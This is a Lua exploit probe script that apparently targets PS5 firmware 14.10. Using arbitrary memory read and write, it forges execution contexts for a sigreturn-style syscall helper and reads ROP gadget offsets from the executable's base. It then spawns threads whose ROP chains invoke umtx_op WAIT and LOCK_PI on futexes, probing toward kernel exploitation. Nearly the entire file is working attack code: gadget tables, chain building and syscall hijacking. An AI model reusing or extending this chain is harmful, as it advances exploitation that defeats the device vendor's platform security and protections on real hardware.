-- CRASH_CLASS: LOW
-- PROBE 142i: Full ROP chain thread with UMTX_OP_WAIT
--
-- 142h revealed sc_addr is in XO memory (system lib, can't read).
-- The kernel may zero GPRs on thread start. Use full ROP chain:
-- pop_rdi → futex, pop_rsi → 6 (WAIT), pop_rax → 454, sc_addr
-- RDX/R10/R8 can be 0 (kernel-zeroed is fine for WAIT: *futex=0==RDX=0)
-- Child blocks in UMTX_OP_WAIT. Main thread checks via thr_kill and sys624.

print("=== PROBE 142i: FULL ROP WAIT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function rq(addr) return memory.read_qword(addr) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC = 0x40
local O_RIP = MC + 0xA0
local O_RSP = MC + 0xB8

local base_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(base_ctx)) end)
local base_rip = rq(base_ctx + O_RIP)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(base_ctx)) end)
    wq(base_ctx + O_RIP, sc_addr)
    wq(base_ctx + MC + 0x38, uint64(num))
    if a1 then wq(base_ctx + MC + 0x08, a1) end
    if a2 then wq(base_ctx + MC + 0x10, a2) end
    if a3 then wq(base_ctx + MC + 0x18, a3) end
    if a4 then wq(base_ctx + MC + 0x50, a4) end
    if a5 then wq(base_ctx + MC + 0x28, a5) end
    if a6 then wq(base_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(base_ctx)) end)
    return rv
end

local ts_buf = memory.alloc(16)
wq(ts_buf, uint64(0)); wq(ts_buf + 8, uint64(500000000))
local function msleep()
    pcall(function() sc_nanosleep(uint64(ts_buf), uint64(0)) end)
end

-- Get eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = safe_rd(info + 0x108) or 0
local ehi = safe_rd(info + 0x10C) or 0
print("eboot=0x" .. string.format("%X%08X", ehi, elo))

-- Gadget offsets (from 142g scan)
local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))

print("ret=" .. hex(g_ret))
print("pop_rax=" .. hex(g_pop_rax))
print("pop_rdi=" .. hex(g_pop_rdi))
print("pop_rsi=" .. hex(g_pop_rsi))

-- Main TID
local tid_main = gpu + 0x100
wq(tid_main, uint64(0))
srop(432, ua(tid_main))
local mt = safe_rq(tid_main)
local mth, mtl = get_hi_lo(mt)
print("main_TID=" .. mtl)

--------------------------------------------------------------------
-- [A] FULL ROP: pop_rdi, pop_rsi, pop_rax, syscall → WAIT(6)
-- All GPRs set via ROP chain. Kernel GPR values don't matter.
--------------------------------------------------------------------
print("")
print("--- [A] Full ROP UMTX_OP_WAIT ---")

local futex_a = gpu + 0x1000
wd(futex_a, 0)  -- *futex = 0

local stack_a = gpu + 0x10000
for off = 0, 0x3FFF, 4 do wd(stack_a + off, 0) end

-- Build ROP chain at stack_a + 0x3000
local rop = stack_a + 0x3000
wq(rop + 0x00, g_pop_rdi)              -- pop rdi; ret
wq(rop + 0x08, ua(futex_a))            -- → rdi = futex address
wq(rop + 0x10, g_pop_rsi)              -- pop rsi; ret
wq(rop + 0x18, uint64(6))              -- → rsi = UMTX_OP_WAIT
wq(rop + 0x20, g_pop_rax)              -- pop rax; ret
wq(rop + 0x28, uint64(454))            -- → rax = 454 (umtx_op)
wq(rop + 0x30, sc_addr)                -- syscall (in XO — executable)
-- rdx=0, r10=0, r8=0 (all zeroed from stack init or kernel)
-- *futex==0 == rdx==0 → thread BLOCKS in WAIT

-- Thread context from getcontext (all fields valid)
local ctx_a = gpu + 0x20000
for off = 0, 0x4FF, 4 do wd(ctx_a + off, 0) end
pcall(function() return sc_gc(uint64(ctx_a)) end)
-- Only override RIP and RSP — everything else from getcontext
wq(ctx_a + O_RIP, g_ret)               -- start at `ret` gadget
wq(ctx_a + O_RSP, ua(rop))             -- stack = ROP chain

local tid_a = gpu + 0x30000
wq(tid_a, uint64(0xDEADDEAD))

-- Measure sys624 before
local s624_bef = srop(624)
local s_bh, s_bl = get_hi_lo(s624_bef)

print("[A] futex=0x" .. string.format("%X", safe_rd(futex_a) or 0))
print("[A] sys624_before=" .. s_bl)
print("[A] Creating WAIT thread...")

local ok_a, rv_a = pcall(function()
    return sc_thr_create(uint64(ctx_a), uint64(tid_a), uint64(0))
end)
local ntid_a = safe_rq(tid_a)
local nah, nal = get_hi_lo(ntid_a)
print("[A] thr_create: ok=" .. tostring(ok_a) .. " rv=" .. tostring(rv_a) .. " tid=" .. nal)

-- Wait 500ms for child to enter WAIT
msleep()

local alive_a = to_num(sc20())
print("[A] alive pid=" .. alive_a)

-- Check sys624 delta (mmap counter)
local s624_aft = srop(624)
local s_ah, s_al = get_hi_lo(s624_aft)
print("[A] sys624_after=" .. s_al .. " delta=" .. (s_al - s_bl))

-- thr_kill check
if nal ~= 0 and nal ~= 0xDEADDEAD then
    local ok_k, rv_k = pcall(function()
        return make_syscall(433)(uint64(nal), uint64(0))
    end)
    print("[A] thr_kill(child,0)=" .. tostring(rv_k))

    local rv_ks = srop(433, uint64(nal), uint64(0))
    local ksh, ksl = get_hi_lo(rv_ks)
    print("[A] srop_thr_kill=" .. hex(rv_ks) .. " (0=alive)")

    if ksl == 0 and ksh == 0 then
        print("[A] *** CHILD THREAD IS ALIVE! ***")
        print("[A] *** THREAD EXECUTION CONFIRMED ON PS5 14.10! ***")
    end
end

-- Check futex
local fva = safe_rd(futex_a)
print("[A] futex=0x" .. string.format("%X", fva or 0))

--------------------------------------------------------------------
-- [B] If [A] works, try LOCK_PI via ROP on owned futex
--------------------------------------------------------------------
print("")
print("--- [B] Full ROP LOCK_PI on owned futex ---")

local futex_b = gpu + 0x2000
wd(futex_b, 0)

-- Main thread acquires LOCK_PI
local rv_ml = srop(454, ua(futex_b), uint64(12), uint64(0), uint64(0), uint64(0))
local fvb_owned = safe_rd(futex_b)
print("[B] main_LOCK_PI: ret=" .. hex(rv_ml) .. " futex=0x" .. string.format("%X", fvb_owned or 0))

local stack_b = gpu + 0x14000
for off = 0, 0x3FFF, 4 do wd(stack_b + off, 0) end

local rop_b = stack_b + 0x3000
wq(rop_b + 0x00, g_pop_rdi)
wq(rop_b + 0x08, ua(futex_b))    -- same futex (owned by main)
wq(rop_b + 0x10, g_pop_rsi)
wq(rop_b + 0x18, uint64(12))     -- LOCK_PI
wq(rop_b + 0x20, g_pop_rax)
wq(rop_b + 0x28, uint64(454))
wq(rop_b + 0x30, sc_addr)

local ctx_b = gpu + 0x28000
for off = 0, 0x4FF, 4 do wd(ctx_b + off, 0) end
pcall(function() return sc_gc(uint64(ctx_b)) end)
wq(ctx_b + O_RIP, g_ret)
wq(ctx_b + O_RSP, ua(rop_b))

local tid_b = gpu + 0x30010
wq(tid_b, uint64(0xDEADDEAD))

print("[B] Creating LOCK_PI thread on owned futex...")
local ok_b, rv_b = pcall(function()
    return sc_thr_create(uint64(ctx_b), uint64(tid_b), uint64(0))
end)
local ntid_b = safe_rq(tid_b)
local nbh, nbl = get_hi_lo(ntid_b)
print("[B] rv=" .. tostring(rv_b) .. " tid=" .. nbl)

msleep()
print("[B] alive pid=" .. to_num(sc20()))

local fvb_after = safe_rd(futex_b)
print("[B] futex=0x" .. string.format("%X", fvb_after or 0))

if fvb_after and fvb_after ~= (fvb_owned or 0) then
    print("[B] *** FUTEX CHANGED! ***")
    if fvb_after >= 0x80000000 then
        print("[B] *** CONTESTED BIT SET! CHILD BLOCKED IN LOCK_PI! ***")
    end
end

if nbl ~= 0 and nbl ~= 0xDEADDEAD then
    local rv_kb = srop(433, uint64(nbl), uint64(0))
    local kbh, kbl = get_hi_lo(rv_kb)
    print("[B] thr_kill=" .. hex(rv_kb) .. " (0=alive)")
end

--------------------------------------------------------------------
-- [C] ROP LOCK_PI on UNOWNED futex (immediate acquire + crash)
-- Read futex immediately after thr_create
--------------------------------------------------------------------
print("")
print("--- [C] ROP LOCK_PI unowned ---")

local futex_c = gpu + 0x3000
wd(futex_c, 0)

local stack_c = gpu + 0x18000
for off = 0, 0x3FFF, 4 do wd(stack_c + off, 0) end

local rop_c = stack_c + 0x3000
wq(rop_c + 0x00, g_pop_rdi)
wq(rop_c + 0x08, ua(futex_c))
wq(rop_c + 0x10, g_pop_rsi)
wq(rop_c + 0x18, uint64(12))     -- LOCK_PI
wq(rop_c + 0x20, g_pop_rax)
wq(rop_c + 0x28, uint64(454))
wq(rop_c + 0x30, sc_addr)

local ctx_c = gpu + 0x30100
for off = 0, 0x4FF, 4 do wd(ctx_c + off, 0) end
pcall(function() return sc_gc(uint64(ctx_c)) end)
wq(ctx_c + O_RIP, g_ret)
wq(ctx_c + O_RSP, ua(rop_c))

local tid_c = gpu + 0x30020
wq(tid_c, uint64(0xDEADDEAD))

print("[C] pre-futex=0x" .. string.format("%X", safe_rd(futex_c) or 0))
print("[C] Creating thread...")
local ok_c, rv_c = pcall(function()
    return sc_thr_create(uint64(ctx_c), uint64(tid_c), uint64(0))
end)
-- Read futex IMMEDIATELY
local fvc_imm = safe_rd(futex_c)
local ntid_c = safe_rq(tid_c)
print("[C] rv=" .. tostring(rv_c) .. " tid=" .. hex(ntid_c))
print("[C] futex_imm=0x" .. string.format("%X", fvc_imm or 0))

msleep()
print("[C] alive pid=" .. to_num(sc20()))
local fvc = safe_rd(futex_c)
print("[C] futex_post=0x" .. string.format("%X", fvc or 0))

if fvc_imm and fvc_imm ~= 0 then
    print("[C] *** LOCK_PI ACQUIRED BY CHILD! (immediate read) ***")
end
if fvc and fvc ~= 0 then
    print("[C] *** LOCK_PI ACQUIRED BY CHILD! (post-sleep) ***")
end

print("")
print("=== DONE ===")
